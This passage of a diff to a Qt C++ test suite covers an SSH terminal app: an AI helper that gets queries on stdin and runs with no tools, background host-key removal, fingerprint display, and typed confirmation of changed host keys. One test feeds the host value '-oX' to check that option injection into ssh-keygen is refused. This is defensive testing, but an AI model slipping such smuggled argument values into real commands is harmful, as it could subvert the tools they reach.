+            QFile::setPermissions(fake, QFile::ReadOwner | QFile::WriteOwner | QFile::ExeOwner);
+            const QByteArray path = qgetenv("PATH"), home = qgetenv("HOME");
+            qputenv("PATH", bin.path().toUtf8() + ":" + path);
+            Assistant viaCode(bin.filePath("key"));
+            qputenv("PATH", path);
+            QCOMPARE(viaCode.claudeCode(), fake);
+            viaCode.setProvider("claude-code");
+            QSignalSpy answered(&viaCode, &Assistant::answered);
+            viaCode.ask("list the secret ports", {{"kind", "ssh"}, {"host", "web"}, {"user", "me"}});
+            QVERIFY(answered.wait(10000));
+            QCOMPARE(answered.first().first().toString(), QString("ss -tlnp"));
+            QFile sent(bin.filePath("stdin")), given(bin.filePath("args"));
+            QVERIFY(sent.open(QIODevice::ReadOnly) && given.open(QIODevice::ReadOnly));
+            const QString onStdin = QString::fromUtf8(sent.readAll()), asArgs = QString::fromUtf8(given.readAll());
+            QVERIFY(onStdin.contains("list the secret ports") && onStdin.contains("ssh to me@web"));
+            QVERIFY2(!asArgs.contains("secret ports") && !asArgs.contains("me@web"), qPrintable(asArgs));
+        }
         QVERIFY(args.contains("--json-schema"));
         // No tools: Claude Code only answers, it never runs anything itself.
         QCOMPARE(args[args.indexOf("--tools") + 1], QString());
@@ -612,11 +1176,22 @@ private slots:
         Backend backend(dir.filePath("tether.json"), dir.filePath("ssh_config"), dir.filePath("logs"));
         backend.setTool("ssh", "/usr/bin/ssh");
         backend.setTool("ssh-keygen", fake);
-        QCOMPARE(backend.forgetHostKey({{"kind", "ssh"}, {"name", "x"}, {"host", "web"}, {"port", 2222}}), QString());
+        // ssh-keygen runs in the background; the answer carries the asker's token.
+        QSignalSpy forgotten(&backend, &Backend::hostKeyForgotten);
+        backend.forgetHostKey({{"kind", "ssh"}, {"name", "x"}, {"host", "web"}, {"port", 2222}}, "pane-7");
+        QVERIFY(forgotten.wait(5000));
+        QCOMPARE(forgotten.first().at(0).toString(), QString("pane-7"));
+        QCOMPARE(forgotten.first().at(1).toString(), QString());
         QFile args(dir.filePath("args"));
         QVERIFY(args.open(QIODevice::ReadOnly));
         QCOMPARE(QString::fromUtf8(args.readAll()).trimmed(), QString("-R [web]:2222"));
-        QVERIFY(!backend.forgetHostKey({{"kind", "ssh"}, {"host", "-oX"}}).isEmpty());
+        backend.forgetHostKey({{"kind", "ssh"}, {"host", "-oX"}}, "pane-8");
+        QVERIFY(forgotten.wait(5000));
+        QVERIFY(!forgotten.last().at(1).toString().isEmpty());
+        write(fake, "#!/bin/sh\necho 'no such file' >&2\nexit 1\n");
+        backend.forgetHostKey({{"kind", "ssh"}, {"name", "x"}, {"host", "web"}}, "pane-9");
+        QVERIFY(forgotten.wait(5000));
+        QVERIFY(forgotten.last().at(1).toString().contains("no such file"));
 
 #ifdef TETHER_LIBSSH
         write(dir.filePath("known_hosts"), "web ssh-ed25519 AAAA1\n[web]:2222 ssh-ed25519 AAAA2\nother ssh-ed25519 AAAA3\n");
@@ -627,6 +1202,16 @@ private slots:
         QVERIFY(left.contains("web ssh-ed25519 AAAA1"));
         QVERIFY(!left.contains("AAAA2"));
         QVERIFY(left.contains("other"));
+
+        // The saved keys of a host, as fingerprints to show beside a new one.
+        write(dir.filePath("known_hosts"),
+              "web ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGlNzf+gXq5FiE2CBcdgvlgMfKFqLNDo4wnYITdFhF2Q\n"
+              "[web]:2222,alias ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGlNzf+gXq5FiE2CBcdgvlgMfKFqLNDo4wnYITdFhF2Q\n"
+              "other ssh-rsa AAAA\n# web ssh-ed25519 AAAA\n");
+        QCOMPARE(SshSession::savedFingerprints(dir.filePath("known_hosts"), "web", 22),
+                 QStringList({"SSH-ED25519 SHA256:NcNb/0mRXe5BdwnQOmYb9jlWJ4dmbhFBDB4q6/oRGoM"}));
+        QCOMPARE(SshSession::savedFingerprints(dir.filePath("known_hosts"), "web", 2222).size(), 1);
+        QVERIFY(SshSession::savedFingerprints(dir.filePath("known_hosts"), "nobody", 22).isEmpty());
 #endif
     }
 
@@ -768,7 +1353,11 @@ private slots:
         server.start(sshd, {"-D", "-f", dir.filePath("sshd_config"), "-E", dir.filePath("sshd.log")});
         QVERIFY(server.waitForStarted());
         QTest::qWait(500);
-        for (const bool trust : {false, true}) {
+        // A changed key can't be agreed to by reflex: "yes" and Enter are
+        // refused, the dialog's no is no, and only the host's name, typed
+        // out (or the dialog, which asks for the same), replaces the key.
+        const QStringList answers{"yes", "", "dialog-no", "127.0.0.1", };
+        for (const QString &answer : answers) {
             TerminalView changed;
             changed.setSize(QSizeF(900, 400));
             QSignalSpy question(&changed, &TerminalView::hostKeyQuestion);
@@ -776,9 +1365,18 @@ private slots:
             QVERIFY(changed.startSsh(settings));
             QVERIFY(question.wait(10000));
             QVERIFY(question.first().at(3).toBool()); // changed
-            changed.answerHostKey(trust);              // as the dialog does
+            // The key saved before, to show beside the new one.
+            const QStringList old = question.first().at(4).toStringList();
+            QCOMPARE(old.size(), 1);
+            QVERIFY2(old.first().startsWith("SSH-ED25519 SHA256:"), qPrintable(old.first()));
+            QVERIFY(!old.first().endsWith(question.first().at(2).toString()));
+            QTRY_VERIFY_WITH_TIMEOUT(changed.screenText(30).contains("type the host's name"), 5000);
+            if (answer == "dialog-no")
+                changed.answerHostKey(false);
+            else
+                changed.sendText(answer + "\r");
             QVERIFY(ended.wait(15000));
-            if (!trust) {
+            if (answer != "127.0.0.1") {
                 QCOMPARE(ended.first().first().toInt(), 254);
                 QVERIFY(changed.screenText(30).contains("Host key verification failed"));
             } else {
